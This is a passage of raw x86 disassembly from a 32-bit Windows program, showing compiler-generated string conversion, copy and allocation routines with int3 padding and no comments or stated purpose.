  40163f:	68 57 00 07 80       	push   $0x80070057
  401644:	e8 b7 f9 ff ff       	call   0x401000
  401649:	68 05 40 00 80       	push   $0x80004005
  40164e:	e8 ad f9 ff ff       	call   0x401000
  401653:	5d                   	pop    %ebp
  401654:	c3                   	ret
  401655:	8d 49 00             	lea    0x0(%ecx),%ecx
  401658:	53                   	push   %ebx
  401659:	16                   	push   %ss
  40165a:	40                   	inc    %eax
  40165b:	00 35 16 40 00 3f    	add    %dh,0x3f004016
  401661:	16                   	push   %ss
  401662:	40                   	inc    %eax
  401663:	00 49 16             	add    %cl,0x16(%ecx)
  401666:	40                   	inc    %eax
  401667:	00 00                	add    %al,(%eax)
  401669:	03 03                	add    (%ebx),%eax
  40166b:	03 03                	add    (%ebx),%eax
  40166d:	03 03                	add    (%ebx),%eax
  40166f:	03 03                	add    (%ebx),%eax
  401671:	03 03                	add    (%ebx),%eax
  401673:	03 01                	add    (%ecx),%eax
  401675:	03 03                	add    (%ebx),%eax
  401677:	03 03                	add    (%ebx),%eax
  401679:	03 03                	add    (%ebx),%eax
  40167b:	03 03                	add    (%ebx),%eax
  40167d:	03 02                	add    (%edx),%eax
  40167f:	03 03                	add    (%ebx),%eax
  401681:	03 03                	add    (%ebx),%eax
  401683:	03 03                	add    (%ebx),%eax
  401685:	03 03                	add    (%ebx),%eax
  401687:	03 03                	add    (%ebx),%eax
  401689:	03 02                	add    (%edx),%eax
  40168b:	03 03                	add    (%ebx),%eax
  40168d:	03 03                	add    (%ebx),%eax
  40168f:	03 03                	add    (%ebx),%eax
  401691:	03 03                	add    (%ebx),%eax
  401693:	03 03                	add    (%ebx),%eax
  401695:	03 03                	add    (%ebx),%eax
  401697:	03 03                	add    (%ebx),%eax
  401699:	03 03                	add    (%ebx),%eax
  40169b:	03 03                	add    (%ebx),%eax
  40169d:	03 03                	add    (%ebx),%eax
  40169f:	03 03                	add    (%ebx),%eax
  4016a1:	03 03                	add    (%ebx),%eax
  4016a3:	03 03                	add    (%ebx),%eax
  4016a5:	03 03                	add    (%ebx),%eax
  4016a7:	03 03                	add    (%ebx),%eax
  4016a9:	03 03                	add    (%ebx),%eax
  4016ab:	03 03                	add    (%ebx),%eax
  4016ad:	03 03                	add    (%ebx),%eax
  4016af:	03 03                	add    (%ebx),%eax
  4016b1:	03 03                	add    (%ebx),%eax
  4016b3:	03 03                	add    (%ebx),%eax
  4016b5:	03 03                	add    (%ebx),%eax
  4016b7:	03 00                	add    (%eax),%eax
  4016b9:	cc                   	int3
  4016ba:	cc                   	int3
  4016bb:	cc                   	int3
  4016bc:	cc                   	int3
  4016bd:	cc                   	int3
  4016be:	cc                   	int3
  4016bf:	cc                   	int3
  4016c0:	55                   	push   %ebp
  4016c1:	8b ec                	mov    %esp,%ebp
  4016c3:	6a ff                	push   $0xffffffff
  4016c5:	68 f1 a3 40 00       	push   $0x40a3f1
  4016ca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4016d0:	50                   	push   %eax
  4016d1:	83 ec 08             	sub    $0x8,%esp
  4016d4:	56                   	push   %esi
  4016d5:	57                   	push   %edi
  4016d6:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4016db:	33 c5                	xor    %ebp,%eax
  4016dd:	50                   	push   %eax
  4016de:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4016e1:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4016e7:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4016ea:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4016f1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4016f8:	83 7d 1c 10          	cmpl   $0x10,0x1c(%ebp)
  4016fc:	8b 45 08             	mov    0x8(%ebp),%eax
  4016ff:	73 03                	jae    0x401704
  401701:	8d 45 08             	lea    0x8(%ebp),%eax
  401704:	6a 00                	push   $0x0
  401706:	6a 00                	push   $0x0
  401708:	6a ff                	push   $0xffffffff
  40170a:	50                   	push   %eax
  40170b:	6a 00                	push   $0x0
  40170d:	6a 00                	push   $0x0
  40170f:	ff 15 b4 b0 40 00    	call   *0x40b0b4
  401715:	8b f8                	mov    %eax,%edi
  401717:	33 c9                	xor    %ecx,%ecx
  401719:	8d 47 01             	lea    0x1(%edi),%eax
  40171c:	ba 02 00 00 00       	mov    $0x2,%edx
  401721:	f7 e2                	mul    %edx
  401723:	0f 90 c1             	seto   %cl
  401726:	f7 d9                	neg    %ecx
  401728:	0b c8                	or     %eax,%ecx
  40172a:	51                   	push   %ecx
  40172b:	e8 2c 15 00 00       	call   0x402c5c
  401730:	8b f0                	mov    %eax,%esi
  401732:	8d 44 3f 02          	lea    0x2(%edi,%edi,1),%eax
  401736:	50                   	push   %eax
  401737:	6a 00                	push   $0x0
  401739:	56                   	push   %esi
  40173a:	e8 b1 24 00 00       	call   0x403bf0
  40173f:	8b 45 08             	mov    0x8(%ebp),%eax
  401742:	83 c4 10             	add    $0x10,%esp
  401745:	83 7d 1c 10          	cmpl   $0x10,0x1c(%ebp)
  401749:	73 03                	jae    0x40174e
  40174b:	8d 45 08             	lea    0x8(%ebp),%eax
  40174e:	57                   	push   %edi
  40174f:	56                   	push   %esi
  401750:	6a ff                	push   $0xffffffff
  401752:	50                   	push   %eax
  401753:	6a 00                	push   $0x0
  401755:	6a 00                	push   $0x0
  401757:	ff 15 b4 b0 40 00    	call   *0x40b0b4
  40175d:	33 c9                	xor    %ecx,%ecx
  40175f:	c7 43 14 07 00 00 00 	movl   $0x7,0x14(%ebx)
  401766:	c7 43 10 00 00 00 00 	movl   $0x0,0x10(%ebx)
  40176d:	66 89 0b             	mov    %cx,(%ebx)
  401770:	8b c6                	mov    %esi,%eax
  401772:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  401779:	8d 50 02             	lea    0x2(%eax),%edx
  40177c:	8d 64 24 00          	lea    0x0(%esp),%esp
  401780:	66 8b 08             	mov    (%eax),%cx
  401783:	83 c0 02             	add    $0x2,%eax
  401786:	66 85 c9             	test   %cx,%cx
  401789:	75 f5                	jne    0x401780
  40178b:	2b c2                	sub    %edx,%eax
  40178d:	d1 f8                	sar    $1,%eax
  40178f:	50                   	push   %eax
  401790:	8b c6                	mov    %esi,%eax
  401792:	8b cb                	mov    %ebx,%ecx
  401794:	e8 77 01 00 00       	call   0x401910
  401799:	56                   	push   %esi
  40179a:	e8 ef 1a 00 00       	call   0x40328e
  40179f:	83 c4 04             	add    $0x4,%esp
  4017a2:	83 7d 1c 10          	cmpl   $0x10,0x1c(%ebp)
  4017a6:	72 0c                	jb     0x4017b4
  4017a8:	8b 55 08             	mov    0x8(%ebp),%edx
  4017ab:	52                   	push   %edx
  4017ac:	e8 c2 18 00 00       	call   0x403073
  4017b1:	83 c4 04             	add    $0x4,%esp
  4017b4:	8b c3                	mov    %ebx,%eax
  4017b6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4017b9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4017c0:	59                   	pop    %ecx
  4017c1:	5f                   	pop    %edi
  4017c2:	5e                   	pop    %esi
  4017c3:	8b e5                	mov    %ebp,%esp
  4017c5:	5d                   	pop    %ebp
  4017c6:	c3                   	ret
  4017c7:	cc                   	int3
  4017c8:	cc                   	int3
  4017c9:	cc                   	int3
  4017ca:	cc                   	int3
  4017cb:	cc                   	int3
  4017cc:	cc                   	int3
  4017cd:	cc                   	int3
  4017ce:	cc                   	int3
  4017cf:	cc                   	int3
  4017d0:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4017d4:	72 0b                	jb     0x4017e1
  4017d6:	8b 06                	mov    (%esi),%eax
  4017d8:	50                   	push   %eax
  4017d9:	e8 95 18 00 00       	call   0x403073
  4017de:	83 c4 04             	add    $0x4,%esp
  4017e1:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4017e8:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4017ef:	c6 06 00             	movb   $0x0,(%esi)
  4017f2:	c3                   	ret
  4017f3:	cc                   	int3
  4017f4:	cc                   	int3
  4017f5:	cc                   	int3
  4017f6:	cc                   	int3
  4017f7:	cc                   	int3
  4017f8:	cc                   	int3
  4017f9:	cc                   	int3
  4017fa:	cc                   	int3
  4017fb:	cc                   	int3
  4017fc:	cc                   	int3
  4017fd:	cc                   	int3
  4017fe:	cc                   	int3
  4017ff:	cc                   	int3
  401800:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  401804:	72 0b                	jb     0x401811
  401806:	8b 06                	mov    (%esi),%eax
  401808:	50                   	push   %eax
  401809:	e8 65 18 00 00       	call   0x403073
  40180e:	83 c4 04             	add    $0x4,%esp
  401811:	33 c9                	xor    %ecx,%ecx
  401813:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  40181a:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  401821:	66 89 0e             	mov    %cx,(%esi)
  401824:	c3                   	ret
  401825:	cc                   	int3
  401826:	cc                   	int3
  401827:	cc                   	int3
  401828:	cc                   	int3
  401829:	cc                   	int3
  40182a:	cc                   	int3
  40182b:	cc                   	int3
  40182c:	cc                   	int3
  40182d:	cc                   	int3
  40182e:	cc                   	int3
  40182f:	cc                   	int3
  401830:	8b 15 b0 07 41 00    	mov    0x4107b0,%edx
  401836:	53                   	push   %ebx
  401837:	8b d8                	mov    %eax,%ebx
  401839:	a1 9c 07 41 00       	mov    0x41079c,%eax
  40183e:	57                   	push   %edi
  40183f:	8b 3d ac 07 41 00    	mov    0x4107ac,%edi
  401845:	85 db                	test   %ebx,%ebx
  401847:	74 3d                	je     0x401886
  401849:	8b c8                	mov    %eax,%ecx
  40184b:	83 fa 10             	cmp    $0x10,%edx
  40184e:	73 05                	jae    0x401855
  401850:	b9 9c 07 41 00       	mov    $0x41079c,%ecx
  401855:	3b d9                	cmp    %ecx,%ebx
  401857:	72 2d                	jb     0x401886
  401859:	8b c8                	mov    %eax,%ecx
  40185b:	83 fa 10             	cmp    $0x10,%edx
  40185e:	73 05                	jae    0x401865
  401860:	b9 9c 07 41 00       	mov    $0x41079c,%ecx
  401865:	03 cf                	add    %edi,%ecx
  401867:	3b cb                	cmp    %ebx,%ecx
  401869:	76 1b                	jbe    0x401886
  40186b:	83 fa 10             	cmp    $0x10,%edx
  40186e:	73 05                	jae    0x401875
  401870:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  401875:	2b d8                	sub    %eax,%ebx
  401877:	8b c6                	mov    %esi,%eax
  401879:	b9 9c 07 41 00       	mov    $0x41079c,%ecx
  40187e:	e8 9d 01 00 00       	call   0x401a20
  401883:	5f                   	pop    %edi
  401884:	5b                   	pop    %ebx
  401885:	c3                   	ret
  401886:	83 fe fe             	cmp    $0xfffffffe,%esi
  401889:	76 0a                	jbe    0x401895
  40188b:	68 c0 d2 40 00       	push   $0x40d2c0
  401890:	e8 f4 13 00 00       	call   0x402c89
  401895:	3b d6                	cmp    %esi,%edx
  401897:	73 55                	jae    0x4018ee
  401899:	57                   	push   %edi
  40189a:	56                   	push   %esi
  40189b:	68 9c 07 41 00       	push   $0x41079c
  4018a0:	e8 1b 04 00 00       	call   0x401cc0
  4018a5:	8b 15 b0 07 41 00    	mov    0x4107b0,%edx
  4018ab:	a1 9c 07 41 00       	mov    0x41079c,%eax
  4018b0:	85 f6                	test   %esi,%esi
  4018b2:	74 32                	je     0x4018e6
  4018b4:	83 fa 10             	cmp    $0x10,%edx
  4018b7:	73 05                	jae    0x4018be
  4018b9:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  4018be:	56                   	push   %esi
  4018bf:	53                   	push   %ebx
  4018c0:	50                   	push   %eax
  4018c1:	e8 aa 24 00 00       	call   0x403d70
  4018c6:	a1 9c 07 41 00       	mov    0x41079c,%eax
  4018cb:	83 c4 0c             	add    $0xc,%esp
  4018ce:	83 3d b0 07 41 00 10 	cmpl   $0x10,0x4107b0
  4018d5:	89 35 ac 07 41 00    	mov    %esi,0x4107ac
  4018db:	73 05                	jae    0x4018e2
  4018dd:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  4018e2:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  4018e6:	5f                   	pop    %edi
  4018e7:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  4018ec:	5b                   	pop    %ebx
  4018ed:	c3                   	ret
  4018ee:	85 f6                	test   %esi,%esi
  4018f0:	75 c2                	jne    0x4018b4
  4018f2:	89 35 ac 07 41 00    	mov    %esi,0x4107ac
  4018f8:	83 fa 10             	cmp    $0x10,%edx
  4018fb:	73 05                	jae    0x401902
  4018fd:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  401902:	5f                   	pop    %edi
  401903:	c6 00 00             	movb   $0x0,(%eax)
  401906:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  40190b:	5b                   	pop    %ebx
  40190c:	c3                   	ret
  40190d:	cc                   	int3
  40190e:	cc                   	int3
  40190f:	cc                   	int3
  401910:	55                   	push   %ebp
  401911:	8b ec                	mov    %esp,%ebp
  401913:	56                   	push   %esi
  401914:	8b f0                	mov    %eax,%esi
  401916:	57                   	push   %edi
  401917:	8b f9                	mov    %ecx,%edi
  401919:	85 f6                	test   %esi,%esi
  40191b:	74 58                	je     0x401975
  40191d:	8b 4f 14             	mov    0x14(%edi),%ecx
  401920:	83 f9 08             	cmp    $0x8,%ecx
  401923:	72 04                	jb     0x401929
  401925:	8b 07                	mov    (%edi),%eax
  401927:	eb 02                	jmp    0x40192b
  401929:	8b c7                	mov    %edi,%eax
  40192b:	3b f0                	cmp    %eax,%esi
  40192d:	72 46                	jb     0x401975
  40192f:	83 f9 08             	cmp    $0x8,%ecx
  401932:	72 04                	jb     0x401938
  401934:	8b 07                	mov    (%edi),%eax
  401936:	eb 02                	jmp    0x40193a
  401938:	8b c7                	mov    %edi,%eax
  40193a:	8b 57 10             	mov    0x10(%edi),%edx
  40193d:	8d 04 50             	lea    (%eax,%edx,2),%eax
  401940:	3b c6                	cmp    %esi,%eax
  401942:	76 31                	jbe    0x401975
  401944:	83 f9 08             	cmp    $0x8,%ecx
  401947:	72 16                	jb     0x40195f
  401949:	8b 07                	mov    (%edi),%eax
  40194b:	2b f0                	sub    %eax,%esi
  40194d:	8b 45 08             	mov    0x8(%ebp),%eax
  401950:	d1 fe                	sar    $1,%esi
  401952:	56                   	push   %esi
  401953:	57                   	push   %edi
  401954:	e8 f7 01 00 00       	call   0x401b50
  401959:	5f                   	pop    %edi
  40195a:	5e                   	pop    %esi
  40195b:	5d                   	pop    %ebp
  40195c:	c2 04 00             	ret    $0x4
  40195f:	8b c7                	mov    %edi,%eax
  401961:	2b f0                	sub    %eax,%esi
  401963:	8b 45 08             	mov    0x8(%ebp),%eax
  401966:	d1 fe                	sar    $1,%esi
  401968:	56                   	push   %esi
  401969:	57                   	push   %edi
  40196a:	e8 e1 01 00 00       	call   0x401b50
  40196f:	5f                   	pop    %edi
  401970:	5e                   	pop    %esi
  401971:	5d                   	pop    %ebp
  401972:	c2 04 00             	ret    $0x4
  401975:	53                   	push   %ebx
  401976:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401979:	81 fb fe ff ff 7f    	cmp    $0x7ffffffe,%ebx
  40197f:	76 0a                	jbe    0x40198b
  401981:	68 c0 d2 40 00       	push   $0x40d2c0
  401986:	e8 fe 12 00 00       	call   0x402c89
  40198b:	8b 47 14             	mov    0x14(%edi),%eax
  40198e:	3b c3                	cmp    %ebx,%eax
  401990:	73 19                	jae    0x4019ab
  401992:	8b 4f 10             	mov    0x10(%edi),%ecx
  401995:	51                   	push   %ecx
  401996:	53                   	push   %ebx
  401997:	57                   	push   %edi
  401998:	e8 c3 05 00 00       	call   0x401f60
  40199d:	85 db                	test   %ebx,%ebx
  40199f:	74 68                	je     0x401a09
  4019a1:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4019a5:	72 2e                	jb     0x4019d5
  4019a7:	8b 07                	mov    (%edi),%eax
  4019a9:	eb 2c                	jmp    0x4019d7
  4019ab:	85 db                	test   %ebx,%ebx
  4019ad:	75 f2                	jne    0x4019a1
  4019af:	89 5f 10             	mov    %ebx,0x10(%edi)
  4019b2:	83 f8 08             	cmp    $0x8,%eax
  4019b5:	72 10                	jb     0x4019c7
  4019b7:	8b 07                	mov    (%edi),%eax
  4019b9:	33 d2                	xor    %edx,%edx
  4019bb:	5b                   	pop    %ebx
  4019bc:	66 89 10             	mov    %dx,(%eax)
  4019bf:	8b c7                	mov    %edi,%eax
  4019c1:	5f                   	pop    %edi
  4019c2:	5e                   	pop    %esi
  4019c3:	5d                   	pop    %ebp
  4019c4:	c2 04 00             	ret    $0x4
  4019c7:	5b                   	pop    %ebx
  4019c8:	8b c7                	mov    %edi,%eax
  4019ca:	33 d2                	xor    %edx,%edx
  4019cc:	5f                   	pop    %edi
  4019cd:	66 89 10             	mov    %dx,(%eax)
  4019d0:	5e                   	pop    %esi
  4019d1:	5d                   	pop    %ebp
  4019d2:	c2 04 00             	ret    $0x4
  4019d5:	8b c7                	mov    %edi,%eax
  4019d7:	03 db                	add    %ebx,%ebx
  4019d9:	53                   	push   %ebx
  4019da:	56                   	push   %esi
  4019db:	50                   	push   %eax
  4019dc:	e8 8f 23 00 00       	call   0x403d70
  4019e1:	8b 45 08             	mov    0x8(%ebp),%eax
  4019e4:	83 c4 0c             	add    $0xc,%esp
  4019e7:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4019eb:	89 47 10             	mov    %eax,0x10(%edi)
  4019ee:	72 11                	jb     0x401a01
  4019f0:	8b 07                	mov    (%edi),%eax
  4019f2:	33 c9                	xor    %ecx,%ecx
  4019f4:	66 89 0c 03          	mov    %cx,(%ebx,%eax,1)
  4019f8:	5b                   	pop    %ebx
  4019f9:	8b c7                	mov    %edi,%eax
  4019fb:	5f                   	pop    %edi
  4019fc:	5e                   	pop    %esi
  4019fd:	5d                   	pop    %ebp
  4019fe:	c2 04 00             	ret    $0x4
  401a01:	8b c7                	mov    %edi,%eax
  401a03:	33 c9                	xor    %ecx,%ecx
  401a05:	66 89 0c 03          	mov    %cx,(%ebx,%eax,1)
  401a09:	5b                   	pop    %ebx
  401a0a:	8b c7                	mov    %edi,%eax
  401a0c:	5f                   	pop    %edi
  401a0d:	5e                   	pop    %esi
  401a0e:	5d                   	pop    %ebp
  401a0f:	c2 04 00             	ret    $0x4
  401a12:	cc                   	int3
  401a13:	cc                   	int3
  401a14:	cc                   	int3
  401a15:	cc                   	int3
  401a16:	cc                   	int3
  401a17:	cc                   	int3
  401a18:	cc                   	int3
  401a19:	cc                   	int3
  401a1a:	cc                   	int3
  401a1b:	cc                   	int3
  401a1c:	cc                   	int3
  401a1d:	cc                   	int3
  401a1e:	cc                   	int3
  401a1f:	cc                   	int3
  401a20:	56                   	push   %esi
  401a21:	57                   	push   %edi
  401a22:	8b 3d ac 07 41 00    	mov    0x4107ac,%edi
  401a28:	8b f1                	mov    %ecx,%esi
  401a2a:	3b fb                	cmp    %ebx,%edi
  401a2c:	73 0a                	jae    0x401a38
  401a2e:	68 a8 d2 40 00       	push   $0x40d2a8
  401a33:	e8 9e 12 00 00       	call   0x402cd6
  401a38:	2b fb                	sub    %ebx,%edi
  401a3a:	3b c7                	cmp    %edi,%eax
  401a3c:	73 02                	jae    0x401a40
  401a3e:	8b f8                	mov    %eax,%edi
  401a40:	81 fe 9c 07 41 00    	cmp    $0x41079c,%esi
  401a46:	75 19                	jne    0x401a61
  401a48:	8d 0c 1f             	lea    (%edi,%ebx,1),%ecx
  401a4b:	83 c8 ff             	or     $0xffffffff,%eax
  401a4e:	e8 fd 01 00 00       	call   0x401c50
  401a53:	8b c3                	mov    %ebx,%eax
  401a55:	33 c9                	xor    %ecx,%ecx
  401a57:	e8 f4 01 00 00       	call   0x401c50
  401a5c:	5f                   	pop    %edi
  401a5d:	8b c6                	mov    %esi,%eax
  401a5f:	5e                   	pop    %esi
  401a60:	c3                   	ret
  401a61:	83 ff fe             	cmp    $0xfffffffe,%edi
  401a64:	76 0a                	jbe    0x401a70
  401a66:	68 c0 d2 40 00       	push   $0x40d2c0
  401a6b:	e8 19 12 00 00       	call   0x402c89
  401a70:	8b 46 14             	mov    0x14(%esi),%eax
  401a73:	3b c7                	cmp    %edi,%eax
  401a75:	73 30                	jae    0x401aa7
  401a77:	8b 46 10             	mov    0x10(%esi),%eax
  401a7a:	50                   	push   %eax
  401a7b:	57                   	push   %edi
  401a7c:	56                   	push   %esi
  401a7d:	e8 3e 02 00 00       	call   0x401cc0
  401a82:	85 ff                	test   %edi,%edi
  401a84:	74 68                	je     0x401aee
  401a86:	8b 0d 9c 07 41 00    	mov    0x41079c,%ecx
  401a8c:	b8 10 00 00 00       	mov    $0x10,%eax
  401a91:	39 05 b0 07 41 00    	cmp    %eax,0x4107b0
  401a97:	73 05                	jae    0x401a9e
  401a99:	b9 9c 07 41 00       	mov    $0x41079c,%ecx
  401a9e:	39 46 14             	cmp    %eax,0x14(%esi)
  401aa1:	72 22                	jb     0x401ac5
  401aa3:	8b 06                	mov    (%esi),%eax
  401aa5:	eb 20                	jmp    0x401ac7
  401aa7:	85 ff                	test   %edi,%edi
  401aa9:	75 db                	jne    0x401a86
  401aab:	89 7e 10             	mov    %edi,0x10(%esi)
  401aae:	83 f8 10             	cmp    $0x10,%eax
  401ab1:	72 0a                	jb     0x401abd
  401ab3:	8b 06                	mov    (%esi),%eax
  401ab5:	c6 00 00             	movb   $0x0,(%eax)
  401ab8:	5f                   	pop    %edi
  401ab9:	8b c6                	mov    %esi,%eax
  401abb:	5e                   	pop    %esi
  401abc:	c3                   	ret
  401abd:	8b c6                	mov    %esi,%eax
  401abf:	5f                   	pop    %edi
  401ac0:	c6 00 00             	movb   $0x0,(%eax)
  401ac3:	5e                   	pop    %esi
  401ac4:	c3                   	ret
  401ac5:	8b c6                	mov    %esi,%eax
  401ac7:	57                   	push   %edi
  401ac8:	03 cb                	add    %ebx,%ecx
  401aca:	51                   	push   %ecx
  401acb:	50                   	push   %eax
  401acc:	e8 9f 22 00 00       	call   0x403d70
  401ad1:	83 c4 0c             	add    $0xc,%esp
  401ad4:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  401ad8:	89 7e 10             	mov    %edi,0x10(%esi)
  401adb:	72 0b                	jb     0x401ae8
  401add:	8b 06                	mov    (%esi),%eax
  401adf:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  401ae3:	5f                   	pop    %edi
  401ae4:	8b c6                	mov    %esi,%eax
  401ae6:	5e                   	pop    %esi
  401ae7:	c3                   	ret
  401ae8:	8b c6                	mov    %esi,%eax
  401aea:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  401aee:	5f                   	pop    %edi
  401aef:	8b c6                	mov    %esi,%eax
  401af1:	5e                   	pop    %esi
  401af2:	c3                   	ret
  401af3:	cc                   	int3
  401af4:	cc                   	int3
  401af5:	cc                   	int3
  401af6:	cc                   	int3
  401af7:	cc                   	int3
  401af8:	cc                   	int3
  401af9:	cc                   	int3
  401afa:	cc                   	int3
  401afb:	cc                   	int3
  401afc:	cc                   	int3
  401afd:	cc                   	int3
  401afe:	cc                   	int3
  401aff:	cc                   	int3
  401b00:	83 fe fe             	cmp    $0xfffffffe,%esi
  401b03:	76 0a                	jbe    0x401b0f
  401b05:	68 c0 d2 40 00       	push   $0x40d2c0
  401b0a:	e8 7a 11 00 00       	call   0x402c89
  401b0f:	8b 48 14             	mov    0x14(%eax),%ecx
  401b12:	3b ce                	cmp    %esi,%ecx
  401b14:	73 14                	jae    0x401b2a
  401b16:	8b 48 10             	mov    0x10(%eax),%ecx
  401b19:	51                   	push   %ecx
  401b1a:	56                   	push   %esi
  401b1b:	50                   	push   %eax
  401b1c:	e8 9f 01 00 00       	call   0x401cc0
  401b21:	33 d2                	xor    %edx,%edx
  401b23:	3b d6                	cmp    %esi,%edx
  401b25:	1b c0                	sbb    %eax,%eax
  401b27:	f7 d8                	neg    %eax
  401b29:	c3                   	ret
  401b2a:	85 f6                	test   %esi,%esi
  401b2c:	75 0d                	jne    0x401b3b
  401b2e:	89 70 10             	mov    %esi,0x10(%eax)
  401b31:	83 f9 10             	cmp    $0x10,%ecx
  401b34:	72 02                	jb     0x401b38
  401b36:	8b 00                	mov    (%eax),%eax
  401b38:	c6 00 00             	movb   $0x0,(%eax)
  401b3b:	33 d2                	xor    %edx,%edx
  401b3d:	3b d6                	cmp    %esi,%edx
  401b3f:	1b c0                	sbb    %eax,%eax
  401b41:	f7 d8                	neg    %eax
  401b43:	c3                   	ret
  401b44:	cc                   	int3
  401b45:	cc                   	int3
  401b46:	cc                   	int3
  401b47:	cc                   	int3
  401b48:	cc                   	int3
  401b49:	cc                   	int3
  401b4a:	cc                   	int3
  401b4b:	cc                   	int3
  401b4c:	cc                   	int3
  401b4d:	cc                   	int3
  401b4e:	cc                   	int3
  401b4f:	cc                   	int3
  401b50:	55                   	push   %ebp
  401b51:	8b ec                	mov    %esp,%ebp
  401b53:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b56:	53                   	push   %ebx
  401b57:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  401b5a:	56                   	push   %esi
  401b5b:	8b 71 10             	mov    0x10(%ecx),%esi
  401b5e:	3b f3                	cmp    %ebx,%esi
  401b60:	73 0a                	jae    0x401b6c
  401b62:	68 a8 d2 40 00       	push   $0x40d2a8
  401b67:	e8 6a 11 00 00       	call   0x402cd6
  401b6c:	2b f3                	sub    %ebx,%esi
  401b6e:	3b c6                	cmp    %esi,%eax
  401b70:	73 02                	jae    0x401b74
  401b72:	8b f0                	mov    %eax,%esi
  401b74:	3b f9                	cmp    %ecx,%edi
  401b76:	75 1e                	jne    0x401b96
  401b78:	8d 0c 1e             	lea    (%esi,%ebx,1),%ecx
  401b7b:	83 c8 ff             	or     $0xffffffff,%eax
  401b7e:	8b f7                	mov    %edi,%esi
  401b80:	e8 4b 03 00 00       	call   0x401ed0
  401b85:	8b c3                	mov    %ebx,%eax
  401b87:	33 c9                	xor    %ecx,%ecx
  401b89:	e8 42 03 00 00       	call   0x401ed0
  401b8e:	5e                   	pop    %esi
  401b8f:	8b c7                	mov    %edi,%eax
  401b91:	5b                   	pop    %ebx
  401b92:	5d                   	pop    %ebp
  401b93:	c2 08 00             	ret    $0x8
  401b96:	8b c7                	mov    %edi,%eax
  401b98:	e8 63 00 00 00       	call   0x401c00
  401b9d:	84 c0                	test   %al,%al
  401b9f:	74 4f                	je     0x401bf0
  401ba1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401ba4:	b8 08 00 00 00       	mov    $0x8,%eax
  401ba9:	39 41 14             	cmp    %eax,0x14(%ecx)
  401bac:	72 02                	jb     0x401bb0
  401bae:	8b 09                	mov    (%ecx),%ecx
  401bb0:	39 47 14             	cmp    %eax,0x14(%edi)
  401bb3:	72 04                	jb     0x401bb9
  401bb5:	8b 07                	mov    (%edi),%eax
  401bb7:	eb 02                	jmp    0x401bbb
  401bb9:	8b c7                	mov    %edi,%eax
  401bbb:	8b 55 0c             	mov    0xc(%ebp),%edx
  401bbe:	8d 1c 36             	lea    (%esi,%esi,1),%ebx
  401bc1:	53                   	push   %ebx
  401bc2:	8d 0c 51             	lea    (%ecx,%edx,2),%ecx
  401bc5:	51                   	push   %ecx
  401bc6:	50                   	push   %eax
  401bc7:	e8 a4 21 00 00       	call   0x403d70
  401bcc:	83 c4 0c             	add    $0xc,%esp
  401bcf:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  401bd3:	89 77 10             	mov    %esi,0x10(%edi)
  401bd6:	72 10                	jb     0x401be8
  401bd8:	8b 07                	mov    (%edi),%eax
  401bda:	33 d2                	xor    %edx,%edx
  401bdc:	66 89 14 03          	mov    %dx,(%ebx,%eax,1)
  401be0:	5e                   	pop    %esi
  401be1:	8b c7                	mov    %edi,%eax
  401be3:	5b                   	pop    %ebx
  401be4:	5d                   	pop    %ebp
  401be5:	c2 08 00             	ret    $0x8
  401be8:	8b c7                	mov    %edi,%eax
  401bea:	33 d2                	xor    %edx,%edx
  401bec:	66 89 14 03          	mov    %dx,(%ebx,%eax,1)
  401bf0:	5e                   	pop    %esi
  401bf1:	8b c7                	mov    %edi,%eax
  401bf3:	5b                   	pop    %ebx
  401bf4:	5d                   	pop    %ebp
  401bf5:	c2 08 00             	ret    $0x8
  401bf8:	cc                   	int3
  401bf9:	cc                   	int3
  401bfa:	cc                   	int3
  401bfb:	cc                   	int3
  401bfc:	cc                   	int3
  401bfd:	cc                   	int3
  401bfe:	cc                   	int3
  401bff:	cc                   	int3
  401c00:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  401c06:	76 0a                	jbe    0x401c12
  401c08:	68 c0 d2 40 00       	push   $0x40d2c0
  401c0d:	e8 77 10 00 00       	call   0x402c89
  401c12:	8b 48 14             	mov    0x14(%eax),%ecx
  401c15:	3b ce                	cmp    %esi,%ecx
  401c17:	73 14                	jae    0x401c2d
  401c19:	8b 48 10             	mov    0x10(%eax),%ecx
  401c1c:	51                   	push   %ecx
  401c1d:	56                   	push   %esi
  401c1e:	50                   	push   %eax
  401c1f:	e8 3c 03 00 00       	call   0x401f60
  401c24:	33 c0                	xor    %eax,%eax
  401c26:	3b c6                	cmp    %esi,%eax
  401c28:	1b c0                	sbb    %eax,%eax
  401c2a:	f7 d8                	neg    %eax
  401c2c:	c3                   	ret
  401c2d:	85 f6                	test   %esi,%esi
  401c2f:	75 0f                	jne    0x401c40
  401c31:	89 70 10             	mov    %esi,0x10(%eax)
  401c34:	83 f9 08             	cmp    $0x8,%ecx
